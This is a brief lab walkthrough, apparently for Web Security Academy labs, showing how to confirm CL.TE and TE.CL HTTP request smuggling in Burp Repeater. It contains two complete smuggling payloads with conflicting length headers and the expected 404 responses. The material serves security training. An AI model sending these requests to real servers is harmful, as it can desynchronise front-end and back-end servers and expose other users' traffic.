# Some cases of HTTP request smuggling

## 1. HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

Using Burp Repeater, issue the following request twice:

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

The second request should receive an HTTP 404 response.

#### Note

Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.

## 2. HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked (setting icon near `Send`)

Using Burp Repeater, issue the following request twice:

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

The second request should receive an HTTP 404 response.

#### Note

Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
